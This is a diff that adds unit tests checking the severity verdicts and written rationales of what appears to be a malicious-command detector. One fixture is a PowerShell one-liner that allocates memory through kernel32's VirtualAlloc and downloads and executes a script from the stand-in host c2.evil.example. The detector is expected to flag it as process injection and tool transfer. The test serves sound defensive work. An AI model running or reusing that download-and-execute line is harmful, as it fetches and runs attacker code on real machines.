@@ -76,5 +76,46 @@ class TestBehavioralCapabilityExtractor(unittest.TestCase):
             self.assertEqual(verdict.severity, Severity.BENIGN)
 
 
+class TestVerdictRationale(unittest.TestCase):
+    """Verify explicit human-readable verdict rationale across BENIGN and non-benign verdicts."""
+
+    def test_va_audit_baseline_benign_rationale(self) -> None:
+        cmd = (
+            "powershell.exe -NoP -Command \"\n"
+            "$code = @'\n"
+            "[DllImport(\"Netapi32.dll\")] public static extern int NetGetJoinInformation(string s, out IntPtr b, out int t);\n"
+            "'@\n"
+            "Add-Type -TypeDefinition $code\n"
+            "\""
+        )
+        verdict = unmask_command(cmd, source_id="va-rat-1")
+        self.assertEqual(verdict.severity, Severity.BENIGN)
+        self.assertIn("Authorized VA Audit Baseline", verdict.verdict_rationale)
+        self.assertIn("Netapi32.dll", verdict.verdict_rationale)
+        self.assertIn("NetGetJoinInformation", verdict.verdict_rationale)
+
+    def test_standard_benign_rationale(self) -> None:
+        verdict = unmask_command("ipconfig /all", source_id="ben-rat-1")
+        self.assertEqual(verdict.severity, Severity.BENIGN)
+        self.assertIn("zero malicious behavioral rules", verdict.verdict_rationale.lower())
+
+    def test_malicious_high_critical_rationale(self) -> None:
+        cmd = (
+            "powershell.exe -NoP -Command \""
+            "Add-Type '[DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);'; "
+            "IEX (New-Object Net.WebClient).DownloadString('http://c2.evil.example/inj.ps1')"
+            "\""
+        )
+        verdict = unmask_command(cmd, source_id="mal-rat-1")
+        self.assertIn(verdict.severity, (Severity.HIGH, Severity.CRITICAL))
+        self.assertIn("T1055", verdict.verdict_rationale)
+        self.assertIn("T1105", verdict.verdict_rationale)
+
+    def test_unknown_empty_input_rationale(self) -> None:
+        verdict = unmask_command("   ", source_id="empty-rat-1")
+        self.assertEqual(verdict.severity, Severity.UNKNOWN)
+        self.assertTrue(len(verdict.verdict_rationale) > 0)
+
+
 if __name__ == "__main__":
     unittest.main()
